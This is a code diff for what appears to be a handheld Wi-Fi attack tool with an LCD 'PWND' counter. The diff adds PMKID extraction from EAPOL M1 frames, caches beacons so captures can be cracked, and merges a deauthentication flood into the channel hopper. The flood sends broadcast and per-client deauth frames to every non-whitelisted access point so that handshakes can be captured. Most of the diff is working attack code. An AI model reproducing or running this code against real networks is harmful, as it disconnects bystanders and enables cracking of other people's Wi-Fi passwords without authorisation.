@@ -85,11 +85,13 @@ HANDSHAKE_DIR = os.path.join(LOOT_DIR, "handshakes")
 # 2.4 GHz channels
 CHANNELS_24_PRIORITY = [1, 6, 11]
 CHANNELS_24_OTHER = [2, 3, 4, 5, 7, 8, 9, 10, 12, 13]
+CHANNELS_24_ALL = list(range(1, 14))
 # 5 GHz channels (common UNII bands)
 CHANNELS_5 = [36, 40, 44, 48, 52, 56, 60, 64, 100, 104, 108, 112, 116, 120, 124, 128, 132, 136, 140, 149, 153, 157, 161, 165]
-DWELL_PRIORITY = 5
-DWELL_OTHER = 2
-DWELL_5GHZ = 3
+DWELL_PRIORITY = 3
+DWELL_OTHER = 1
+DWELL_5GHZ = 2
+DWELL_DEAUTH = 5          # stay on channel after deauth to catch EAPOL
 
 DEAUTH_COUNT = 5
 HALF_HS_MIN = 2  # minimum EAPOL msgs for half-handshake
@@ -118,6 +120,7 @@ session_pmkid = 0
 session_deauths = 0
 captured_bssids = set()
 eapol_buffer = {}
+beacon_cache = {}  # bssid -> raw beacon pkt (for aircrack ESSID)
 last_capture_ssid = ""
 
 # Channel activity tracking for smart hopping
@@ -296,15 +299,15 @@ def _monitor_up(iface):
     ]:
         subprocess.run(cmd, capture_output=True, timeout=5)
     time.sleep(0.5)
-    r = subprocess.run(["iwconfig", iface], capture_output=True, text=True, timeout=5)
-    if "Mode:Monitor" in r.stdout:
+    r = subprocess.run(["iw", "dev", iface, "info"], capture_output=True, text=True, timeout=5)
+    if "type monitor" in r.stdout:
         return iface
     subprocess.run(["sudo", "airmon-ng", "start", iface],
                    capture_output=True, timeout=15)
     for name in (f"{iface}mon", iface):
-        r = subprocess.run(["iwconfig", name], capture_output=True, text=True,
+        r = subprocess.run(["iw", "dev", name, "info"], capture_output=True, text=True,
                            timeout=5)
-        if "Mode:Monitor" in r.stdout:
+        if "type monitor" in r.stdout:
             return name
     return None
 
@@ -449,6 +452,9 @@ def _packet_handler(pkt):
             essid = "<hidden>"
         if _is_whitelisted(bssid, essid):
             return
+        # Cache raw beacon for inclusion in handshake pcaps
+        if bssid not in beacon_cache:
+            beacon_cache[bssid] = pkt
         sig = getattr(pkt, "dBm_AntSignal", -99)
         with lock:
             if bssid not in session_aps:
@@ -462,42 +468,7 @@ def _packet_handler(pkt):
             channel_activity[current_channel] = channel_activity.get(current_channel, 0) + 1
             channel_total[current_channel] = channel_total.get(current_channel, 0) + 1
 
-        # -- PMKID extraction from RSN IE --
-        if bssid not in captured_bssids:
-            try:
-                elt = pkt[Dot11Elt]
-                while elt:
-                    if elt.ID == 48 and len(elt.info) >= 20:
-                        rsn_data = elt.info
-                        # PMKID is in the PMKID List field at the end
-                        if len(rsn_data) > 24:
-                            pmkid_candidate = rsn_data[-16:]
-                            if pmkid_candidate != b'\x00' * 16:
-                                with lock:
-                                    if bssid not in captured_bssids:
-                                        captured_bssids.add(bssid)
-                                        session_pmkid += 1
-                                        lifetime_pmkid += 1
-                                        lifetime_networks += 1
-                                        last_capture_ssid = essid
-                                        last_capture_time = time.time()
-                                        capture_flash = 30
-                                        _save_capture(bssid, essid, [pkt],
-                                                      "pmkid")
-                                        _save_stats()
-                                        threading.Thread(
-                                            target=_send_webhook,
-                                            args=(
-                                                f"PMKID captured: {essid} "
-                                                f"({bssid})",
-                                            ),
-                                            daemon=True,
-                                        ).start()
-                                break
-                    elt = (elt.payload.getlayer(Dot11Elt)
-                           if elt.payload else None)
-            except Exception:
-                pass
+        # PMKID extraction moved to EAPOL M1 handler below
 
     # -- Data frames: discover clients --
     if pkt.haslayer(Dot11) and pkt[Dot11].type == 2:
@@ -521,7 +492,7 @@ def _packet_handler(pkt):
         except Exception:
             pass
 
-    # -- EAPOL: handshake capture --
+    # -- EAPOL: handshake + PMKID capture --
     if pkt.haslayer(EAPOL) and pkt.haslayer(Dot11):
         src = (pkt[Dot11].addr2 or "").upper()
         dst = (pkt[Dot11].addr1 or "").upper()
@@ -540,6 +511,58 @@ def _packet_handler(pkt):
                     bssid = mac
                     break
 
+            # PMKID extraction from EAPOL M1 Key Data
+            # M1 is sent by AP (src=bssid), has ANonce but no MIC
+            if bssid and bssid == src and bssid not in captured_bssids:
+                try:
+                    eapol_raw = bytes(pkt[EAPOL])
+                    # EAPOL-Key: type(1) + info(2) + keylen(2) + replay(8)
+                    #            + nonce(32) + iv(16) + rsc(8) + id(8)
+                    #            + mic(16) + data_len(2) + data(...)
+                    if len(eapol_raw) > 99:
+                        key_info = int.from_bytes(eapol_raw[5:7], "big")
+                        # M1: pairwise=1, ack=1, mic=0
+                        is_m1 = (key_info & 0x08) and (key_info & 0x80) and not (key_info & 0x100)
+                        if is_m1:
+                            data_len = int.from_bytes(eapol_raw[97:99], "big")
+                            key_data = eapol_raw[99:99 + data_len]
+                            # Search for PMKID in RSN KDE: OUI 00-0F-AC, type 4
+                            i = 0
+                            while i + 6 < len(key_data):
+                                kde_type = key_data[i]
+                                kde_len = key_data[i + 1]
+                                if kde_type == 0xdd and kde_len >= 20:
+                                    oui = key_data[i + 2:i + 5]
+                                    data_type = key_data[i + 5]
+                                    if oui == b'\x00\x0f\xac' and data_type == 4:
+                                        pmkid = key_data[i + 6:i + 22]
+                                        if pmkid != b'\x00' * 16:
+                                            captured_bssids.add(bssid)
+                                            session_pmkid += 1
+                                            lifetime_pmkid += 1
+                                            lifetime_networks += 1
+                                            essid_pm = session_aps.get(bssid, {}).get("essid", "unknown")
+                                            last_capture_ssid = essid_pm
+                                            last_capture_time = time.time()
+                                            capture_flash = 30
+                                            # Save beacon + M1 for hcxpcapngtool
+                                            save_pkts = []
+                                            if bssid in beacon_cache:
+                                                save_pkts.append(beacon_cache[bssid])
+                                            save_pkts.append(pkt)
+                                            _save_capture(bssid, essid_pm,
+                                                          save_pkts, "pmkid")
+                                            _save_stats()
+                                            threading.Thread(
+                                                target=_send_webhook,
+                                                args=(f"PMKID captured: {essid_pm} ({bssid})",),
+                                                daemon=True,
+                                            ).start()
+                                        break
+                                i += 2 + kde_len if kde_len > 0 else i + 2
+                except Exception:
+                    pass
+
             if bssid and bssid not in captured_bssids:
                 essid = session_aps.get(bssid, {}).get("essid", "unknown")
 
@@ -552,8 +575,12 @@ def _packet_handler(pkt):
                     last_capture_ssid = essid
                     last_capture_time = time.time()
                     capture_flash = 30
+                    save_pkts = []
+                    if bssid in beacon_cache:
+                        save_pkts.append(beacon_cache[bssid])
+                    save_pkts.extend(eapol_buffer[pair])
                     fname = _save_capture(bssid, essid,
-                                          eapol_buffer[pair], "hs4")
+                                          save_pkts, "hs4")
                     _save_stats()
                     threading.Thread(
                         target=_send_webhook,
@@ -621,7 +648,11 @@ def _half_hs_checker():
                     last_capture_ssid = essid
                     last_capture_time = now
                     capture_flash = 20
-                    _save_capture(bssid, essid, pkts, "hs_half")
+                    save_pkts = []
+                    if bssid in beacon_cache:
+                        save_pkts.append(beacon_cache[bssid])
+                    save_pkts.extend(pkts)
+                    _save_capture(bssid, essid, save_pkts, "hs_half")
                     _save_stats()
                     threading.Thread(
                         target=_send_webhook,
@@ -636,54 +667,165 @@ def _half_hs_checker():
 
 
 def _channel_hopper():
-    """Smart channel hopping: 2.4GHz priority + 5GHz scan."""
-    global current_channel
+    """Smart channel hopping with integrated deauth.
+
+    Strategy:
+    - Build a prioritised channel schedule based on known APs and clients
+    - Channels with uncaptured APs that have clients get deauth + long dwell
+    - Other channels get short scan dwell
+    - 5GHz treated equally when APs are known on those channels
+    - After deauth, stay on channel to capture EAPOL response
+    """
+    global current_channel, session_deauths
+    supported_5g = set()   # 5GHz channels the adapter actually supports
+    checked_5g = set()     # channels we already tried
+
+    def _dwell(seconds):
+        for _ in range(int(seconds * 10)):
+            if not _running or not capturing:
+                return False
+            time.sleep(0.1)
+        return True
+
+    def _hop(ch):
+        """Set channel, return True if successful."""
+        global current_channel
+        if ch > 14 and ch in checked_5g and ch not in supported_5g:
+            return False  # known unsupported
+        r = subprocess.run(
+            ["sudo", "iw", "dev", mon_iface, "set", "channel", str(ch)],
+            capture_output=True, timeout=3,
+        )
+        if ch > 14:
+            checked_5g.add(ch)
+            if r.returncode == 0:
+                supported_5g.add(ch)
+            else:
+                return False
+        with lock:
+            current_channel = ch
+        return True
+
+    def _do_deauth_on_channel(ch):
+        """Deauth uncaptured APs on this channel. Returns number deauthed."""
+        if not deauth_enabled:
+            return 0
+        with lock:
+            targets = []
+            for bssid, info in session_aps.items():
+                if info.get("channel") != ch:
+                    continue
+                if _is_whitelisted(bssid, info.get("essid", "")):
+                    continue
+                if bssid in captured_bssids:
+                    continue
+                clients = list(info.get("clients", set()))
+                sig = info.get("signal", -99)
+                targets.append((bssid, clients, sig))
+
+        if not targets:
+            return 0
+
+        # Sort: most clients first, then best signal
+        targets.sort(key=lambda x: (len(x[1]), x[2] + 100), reverse=True)
+        count = 0
+
+        for bssid, clients, _ in targets:
+            try:
+                # Broadcast deauth
+                broadcast = (
+                    RadioTap()
+                    / Dot11(addr1="FF:FF:FF:FF:FF:FF", addr2=bssid,
+                            addr3=bssid, type=0, subtype=12)
+                    / Dot11Deauth(reason=7)
+                )
+                sendp(broadcast, iface=mon_iface, count=DEAUTH_COUNT,
+                      inter=0.02, verbose=False)
+
+                # Targeted deauth for each client (bidirectional)
+                for client in clients:
+                    d2c = (
+                        RadioTap()
+                        / Dot11(addr1=client, addr2=bssid, addr3=bssid,
+                                type=0, subtype=12)
+                        / Dot11Deauth(reason=7)
+                    )
+                    d2a = (
+                        RadioTap()
+                        / Dot11(addr1=bssid, addr2=client, addr3=bssid,
+                                type=0, subtype=12)
+                        / Dot11Deauth(reason=7)
+                    )
+                    sendp(d2c, iface=mon_iface, count=DEAUTH_COUNT,
+                          inter=0.02, verbose=False)
+                    sendp(d2a, iface=mon_iface, count=DEAUTH_COUNT,
+                          inter=0.02, verbose=False)
+
+                count += 1
+                with lock:
+                    session_deauths += 1
+            except Exception:
+                pass
+
+        return count
+
     while _running and capturing:
-        # 2.4 GHz priority channels (1, 6, 11)
-        for ch in CHANNELS_24_PRIORITY:
+        # --- Build smart channel schedule ---
+        with lock:
+            # Channels with uncaptured APs sorted by client count
+            hot_channels = {}  # ch -> (total_clients, has_uncaptured)
+            for bssid, info in session_aps.items():
+                ch = info.get("channel", 0)
+                if not ch:
+                    continue
+                cli = len(info.get("clients", set()))
+                uncap = bssid not in captured_bssids and not _is_whitelisted(
+                    bssid, info.get("essid", ""))
+                prev = hot_channels.get(ch, (0, False))
+                hot_channels[ch] = (prev[0] + cli, prev[1] or uncap)
+
+        # Phase 1: Hot channels (have uncaptured APs with clients)
+        hot_list = [
+            (ch, cli, uncap) for ch, (cli, uncap) in hot_channels.items()
+            if uncap and cli > 0
+        ]
+        hot_list.sort(key=lambda x: x[1], reverse=True)
+
+        for ch, _, _ in hot_list:
             if not _running or not capturing:
                 return
-            _set_channel(mon_iface, ch)
-            with lock:
-                current_channel = ch
-            dwell = DWELL_PRIORITY
-            with lock:
-                act = channel_activity.get(ch, 0)
-            if act > 50:
-                dwell = min(10, dwell + 2)
-            for _ in range(dwell * 10):
-                if not _running or not capturing:
-                    return
-                time.sleep(0.1)
+            if not _hop(ch):
+                continue
+            # Deauth + long dwell to capture response
+            deauthed = _do_deauth_on_channel(ch)
+            dwell_time = DWELL_DEAUTH if deauthed > 0 else DWELL_PRIORITY
+            if not _dwell(dwell_time):
+                return
 
-        # 2.4 GHz other channels
-        for ch in CHANNELS_24_OTHER:
+        # Phase 2: All 2.4GHz channels (discovery)
+        for ch in CHANNELS_24_ALL:
             if not _running or not capturing:
                 return
-            _set_channel(mon_iface, ch)
-            with lock:
-                current_channel = ch
-            for _ in range(DWELL_OTHER * 10):
-                if not _running or not capturing:
-                    return
-                time.sleep(0.1)
+            if not _hop(ch):
+                continue
+            # Quick deauth if there are targets
+            deauthed = _do_deauth_on_channel(ch)
+            dwell_time = DWELL_DEAUTH if deauthed > 0 else (
+                DWELL_PRIORITY if ch in CHANNELS_24_PRIORITY else DWELL_OTHER
+            )
+            if not _dwell(dwell_time):
+                return
 
-        # 5 GHz channels (if adapter supports it)
+        # Phase 3: 5GHz channels
         for ch in CHANNELS_5:
             if not _running or not capturing:
                 return
-            r = subprocess.run(
-                ["sudo", "iw", "dev", mon_iface, "set", "channel", str(ch)],
-                capture_output=True, timeout=3,
-            )
-            if r.returncode != 0:
-                continue  # adapter doesn't support this channel
-            with lock:
-                current_channel = ch
-            for _ in range(DWELL_5GHZ * 10):
-                if not _running or not capturing:
-                    return
-                time.sleep(0.1)
+            if not _hop(ch):
+                continue
+            deauthed = _do_deauth_on_channel(ch)
+            dwell_time = DWELL_DEAUTH if deauthed > 0 else DWELL_5GHZ
+            if not _dwell(dwell_time):
+                return
 
         # Stealth: randomize MAC between cycles
         if stealth_enabled and mon_iface:
@@ -704,91 +846,7 @@ def _sniffer():
         pass
 
 
-def _deauther():
-    """Enhanced deauth: broadcast + all clients, adaptive interval."""
-    global session_deauths
-    while _running and capturing:
-        # Adaptive interval based on AP count
-        with lock:
-            ap_count = len(session_aps)
-        if ap_count > 10:
-            interval = 15
-        elif ap_count >= 3:
-            interval = 25
-        else:
-            interval = 40
-
-        for _ in range(interval * 10):
-            if not _running or not capturing or not deauth_enabled:
-                time.sleep(0.1)
-                continue
-            time.sleep(0.1)
-
-        if not deauth_enabled or not _running or not capturing:
-            continue
-
-        with lock:
-            # Build target list sorted by client count (most clients first)
-            targets = []
-            for bssid, info in session_aps.items():
-                if _is_whitelisted(bssid, info.get("essid", "")):
-                    continue
-                if bssid in captured_bssids:
-                    continue
-                clients = list(info.get("clients", set()))
-                targets.append((
-                    bssid,
-                    clients,
-                    info.get("channel", 1),
-                    len(clients),
-                ))
-
-        if not targets:
-            continue
-
-        # Sort by client count (more clients = higher priority)
-        targets.sort(key=lambda x: x[3], reverse=True)
-        bssid, clients, ch, _ = targets[0]
-
-        try:
-            # Hop to the target AP's channel for deauth + capture
-            _set_channel(mon_iface, ch)
-            with lock:
-                current_channel = ch
-
-            # Broadcast deauth (FF:FF:FF:FF:FF:FF)
-            broadcast_deauth = (
-                RadioTap()
-                / Dot11(addr1="FF:FF:FF:FF:FF:FF", addr2=bssid,
-                        addr3=bssid, type=0, subtype=12)
-                / Dot11Deauth(reason=7)
-            )
-            sendp(broadcast_deauth, iface=mon_iface, count=DEAUTH_COUNT,
-                  inter=0.05, verbose=False)
-
-            # Targeted deauth for ALL known clients of this AP
-            for client in clients:
-                deauth_to_client = (
-                    RadioTap()
-                    / Dot11(addr1=client, addr2=bssid, addr3=bssid,
-                            type=0, subtype=12)
-                    / Dot11Deauth(reason=7)
-                )
-                deauth_to_ap = (
-                    RadioTap()
-                    / Dot11(addr1=bssid, addr2=client, addr3=bssid,
-                            type=0, subtype=12)
-                    / Dot11Deauth(reason=7)
-                )
-                sendp(deauth_to_client, iface=mon_iface,
-                      count=DEAUTH_COUNT, inter=0.05, verbose=False)
-                sendp(deauth_to_ap, iface=mon_iface,
-                      count=DEAUTH_COUNT, inter=0.05, verbose=False)
-
-            with lock:
-                session_deauths += 1
-        except Exception:
-            pass
+    # _deauther is now integrated into _channel_hopper for channel sync
 
 
 def _activity_sampler():
@@ -977,11 +1035,11 @@ def _draw_face(lcd, font_obj, font_sm):
     y += 12
 
     # PWND
-    total_pwnd = hs + hhs
+    total_pwnd = hs + hhs + pm
     lt_total = lt_hs + lt_hhs + lt_pm
     pwnd_color = "#00FF00" if total_pwnd > 0 else "#888"
-    d.text((2, y), f"PWND:{hs}+{hhs}h", font=font_sm, fill=pwnd_color)
-    d.text((80, y), f"({lt_total})", font=font_sm, fill="#666")
+    d.text((2, y), f"PWND:{hs}+{hhs}h+{pm}p", font=font_sm, fill=pwnd_color)
+    d.text((90, y), f"({lt_total})", font=font_sm, fill="#666")
     y += 12
 
     # Uptime
@@ -1017,69 +1075,81 @@ def _draw_stats(lcd, font_obj, font_sm, scroll):
     img = Image.new("RGB", (WIDTH, HEIGHT), "black")
     d = ScaledDraw(img)
 
-    # Header
-    d.rectangle((0, 0, 127, 13), fill="#111")
-    with lock:
-        aps = len(session_aps)
-        total_clients = len(session_clients)
-    d.text((2, 1), "STATS", font=font_sm, fill="#00FF00")
-    d.text((50, 1), f"AP:{aps} CLI:{total_clients}",
-           font=font_sm, fill="#888")
-
     with lock:
         ch_act = dict(channel_total)
         cur_ch = current_channel
+        aps_snap = dict(session_aps)
+        clients_snap = len(session_clients)
+        captured = set(captured_bssids)
 
-    # Determine band
-    is_5g = cur_ch > 14
-    band_label = "5GHz" if is_5g else "2.4G"
+    # All channels: 2.4GHz (1-13) + all 5GHz
+    all_channels = list(range(1, 14)) + list(CHANNELS_5)
+
+    # Scroll = selected channel index, controlled by LEFT/RIGHT
+    sel_idx = max(0, min(scroll, len(all_channels) - 1))
+    sel_ch = all_channels[sel_idx]
+
+    # --- Header: selected channel info (y=0-11) ---
+    is_5g = sel_ch > 14
+    band_label = "5G" if is_5g else "2.4"
     band_color = "#FF00FF" if is_5g else "#58a6ff"
+    act_sel = ch_act.get(sel_ch, 0)
+    d.rectangle((0, 0, 127, 11), fill="#111")
+    d.text((2, 1), f"CH{sel_ch}", font=font_sm, fill="#FFFFFF")
+    d.text((30, 1), band_label, font=font_sm, fill=band_color)
+    d.text((48, 1), f"p:{act_sel}", font=font_sm, fill="#FFAA00")
+    d.text((80, 1), f"AP:{len(aps_snap)} C:{clients_snap}",
+           font=font_sm, fill="#888")
 
-    # Current channel info line
-    act_cur = ch_act.get(cur_ch, 0)
-    d.text((2, 16), f"CH:{cur_ch}", font=font_sm, fill="#FFFFFF")
-    d.text((40, 16), band_label, font=font_sm, fill=band_color)
-    d.text((70, 16), f"pkts:{act_cur}", font=font_sm, fill="#FFAA00")
+    # --- Channel bar (y=12-22): horizontal scrolling strip ---
+    strip_y = 13
+    # Show 13 channels centered on selection
+    strip_size = 13
+    strip_half = strip_size // 2
+    strip_start = max(0, sel_idx - strip_half)
+    strip_start = min(strip_start, max(0, len(all_channels) - strip_size))
+    strip_end = min(len(all_channels), strip_start + strip_size)
+    strip_chs = all_channels[strip_start:strip_end]
 
-    # --- Unified channel radar (y=28 to y=72) ---
-    # Build list of all channels with activity + always show all 2.4GHz
-    all_channels = list(range(1, 14))
-    for c in CHANNELS_5:
-        if ch_act.get(c, 0) > 0 or c == cur_ch:
-            all_channels.append(c)
+    cell_w = 124 // max(len(strip_chs), 1)
+    cell_w = max(8, min(cell_w, 12))
 
-    # Find window centered on current channel
-    if cur_ch in all_channels:
-        center_idx = all_channels.index(cur_ch)
-    else:
-        all_channels.append(cur_ch)
-        all_channels.sort()
-        center_idx = all_channels.index(cur_ch)
+    # Scroll arrows
+    if strip_start > 0:
+        d.text((0, strip_y), "<", font=font_sm, fill="#555")
+    if strip_end < len(all_channels):
+        d.text((124, strip_y), ">", font=font_sm, fill="#555")
 
-    # Show max 15 channels, centered on current
-    window_size = 15
-    half = window_size // 2
-    start = max(0, center_idx - half)
-    end = min(len(all_channels), start + window_size)
-    start = max(0, end - window_size)
-    visible_channels = all_channels[start:end]
+    for i, ch in enumerate(strip_chs):
+        x = 2 + i * cell_w
+        if ch == sel_ch:
+            d.rectangle((x - 1, strip_y - 1, x + cell_w - 2, strip_y + 9),
+                         fill="#333")
+            ch_color = "#FFFFFF"
+        elif ch == cur_ch:
+            ch_color = "#00FFFF"
+        elif ch_act.get(ch, 0) > 0:
+            ch_color = "#00FF00" if ch <= 14 else "#FF00FF"
+        else:
+            ch_color = "#333"
+        d.text((x, strip_y), str(ch), font=font_sm, fill=ch_color)
 
-    max_act = max((ch_act.get(c, 0) for c in visible_channels), default=1) or 1
-    bar_top = 28
-    bar_h_max = 30
-    bar_w = max(3, 124 // max(len(visible_channels), 1))
+    # --- Mini bar chart for selected channel neighborhood (y=24-48) ---
+    bar_top = 25
+    bar_h_max = 22
+    max_act = max((ch_act.get(c, 0) for c in strip_chs), default=1) or 1
 
-    for i, ch in enumerate(visible_channels):
-        x = 2 + i * bar_w
+    for i, ch in enumerate(strip_chs):
+        x = 2 + i * cell_w
         act = ch_act.get(ch, 0)
         bh = max(1, int(act / max_act * bar_h_max)) if act > 0 else 0
 
-        # Color: white=current, green=high, yellow=medium, dark=inactive
-        # Purple tint for 5GHz channels
-        if ch == cur_ch:
+        if ch == sel_ch:
             bar_color = "#FFFFFF"
+        elif ch == cur_ch:
+            bar_color = "#00FFFF"
         elif ch > 14:
-            bar_color = "#FF00FF" if act > max_act * 0.3 else "#442244"
+            bar_color = "#FF00FF" if act > max_act * 0.3 else "#331133"
         elif act > max_act * 0.6:
             bar_color = "#00FF00"
         elif act > 0:
@@ -1088,65 +1158,48 @@ def _draw_stats(lcd, font_obj, font_sm, scroll):
             bar_color = "#181818"
 
         if bh > 0:
-            d.rectangle((x, bar_top + bar_h_max - bh, x + bar_w - 2, bar_top + bar_h_max), fill=bar_color)
+            d.rectangle((x, bar_top + bar_h_max - bh,
+                          x + cell_w - 2, bar_top + bar_h_max),
+                         fill=bar_color)
         else:
-            d.rectangle((x, bar_top + bar_h_max - 1, x + bar_w - 2, bar_top + bar_h_max), fill="#181818")
-
-        # Channel number below bar
-        ch_str = str(ch)
-        ch_color = "#FFFFFF" if ch == cur_ch else "#555"
-        if bar_w >= 7:
-            d.text((x, bar_top + bar_h_max + 2), ch_str[:2], font=font_sm, fill=ch_color)
-
-    # Marker arrow above current channel bar
-    if cur_ch in visible_channels:
-        ci = visible_channels.index(cur_ch)
-        arrow_x = 2 + ci * bar_w + bar_w // 2
-        d.polygon([(arrow_x - 2, bar_top - 2), (arrow_x + 2, bar_top - 2), (arrow_x, bar_top - 5)], fill="#FFFFFF")
+            d.line((x, bar_top + bar_h_max, x + cell_w - 2,
+                     bar_top + bar_h_max), fill="#181818")
 
     # --- Separator ---
-    y_sep = bar_top + bar_h_max + 14
-    d.line([(0, y_sep), (127, y_sep)], fill="#333")
+    sep_y = bar_top + bar_h_max + 2
+    d.line([(0, sep_y), (127, sep_y)], fill="#333")
 
-    # --- Top APs ---
-    y = y_sep + 2
-    d.text((2, y), "TOP APs:", font=font_sm, fill="#58a6ff")
-    y += 10
+    # --- APs on selected channel (y=sep+2 to y=115) ---
+    y = sep_y + 2
 
-    with lock:
-        aps_list = sorted(
-            session_aps.items(),
-            key=lambda x: len(x[1].get("clients", set())),
-            reverse=True,
-        )
+    aps_on_ch = [
+        (bssid, info) for bssid, info in aps_snap.items()
+        if info.get("channel") == sel_ch
+    ]
+    aps_on_ch.sort(key=lambda x: len(x[1].get("clients", set())),
+                   reverse=True)
 
-    max_aps = max(2, (115 - y) // 11)
-    visible_aps = aps_list[scroll:scroll + max_aps]
-    for bssid, info in visible_aps:
-        essid = info.get("essid", "?")[:11]
-        cli = len(info.get("clients", set()))
-        sig = info.get("signal", -99)
-        pwned = "!" if bssid in captured_bssids else " "
-        name_color = "#00FF00" if bssid in captured_bssids else "#FFFFFF"
-        d.text((2, y), f"{pwned}{essid}", font=font_sm, fill=name_color)
-        d.text((75, y), f"{cli}c {sig}dB", font=font_sm, fill="#888")
-        y += 11
-
-    if not aps_list:
-        d.text((4, y), "No APs yet", font=font_sm, fill="#666")
-
-    # Average signal
-    if aps_list:
-        sigs = [info.get("signal", -99) for _, info in aps_list
-                if info.get("signal", -99) != -99]
-        if sigs:
-            avg_sig = sum(sigs) // len(sigs)
-            d.text((2, 105), f"AVG Signal: {avg_sig}dBm",
-                   font=font_sm, fill="#888")
+    rows_avail = (114 - y) // 10
+    if aps_on_ch:
+        for bssid, info in aps_on_ch[:rows_avail]:
+            essid = info.get("essid", "?")[:12]
+            cli = len(info.get("clients", set()))
+            sig = info.get("signal", -99)
+            pwned = "!" if bssid in captured else " "
+            name_color = "#00FF00" if bssid in captured else "#FFFFFF"
+            d.text((2, y), f"{pwned}{essid}", font=font_sm, fill=name_color)
+            d.text((80, y), f"{cli}c", font=font_sm, fill="#FFAA00")
+            d.text((100, y), f"{sig}", font=font_sm, fill="#888")
+            y += 10
+        if len(aps_on_ch) > rows_avail:
+            d.text((2, y), f"+{len(aps_on_ch) - rows_avail} more",
+                   font=font_sm, fill="#555")
+    else:
+        d.text((4, y), f"CH{sel_ch}: no APs", font=font_sm, fill="#444")
 
     # Footer
     d.rectangle((0, 116, 127, 127), fill="#111")
-    d.text((2, 117), f"{len(aps_list)}APs U/D:Scrl K1:View",
+    d.text((2, 117), "L/R:Nav K1:View K3:Back",
            font=font_sm, fill="#888")
     lcd.LCD_ShowImage(img, 0, 0)
 
@@ -1325,7 +1378,6 @@ def main():
                     threading.Thread(target=_channel_hopper,
                                     daemon=True).start()
                     threading.Thread(target=_sniffer, daemon=True).start()
-                    threading.Thread(target=_deauther, daemon=True).start()
                     threading.Thread(target=_half_hs_checker,
                                     daemon=True).start()
                 else:
@@ -1336,6 +1388,14 @@ def main():
                 deauth_enabled = not deauth_enabled
                 _save_config()
                 time.sleep(0.3)
+
+            elif btn == "LEFT" and view == "stats":
+                scroll = max(0, scroll - 1)
+                time.sleep(0.15)
+
+            elif btn == "RIGHT" and view == "stats":
+                scroll += 1
+                time.sleep(0.15)
 
             elif btn == "KEY1":
                 # Cycle views: face > stats > captures > whitelist
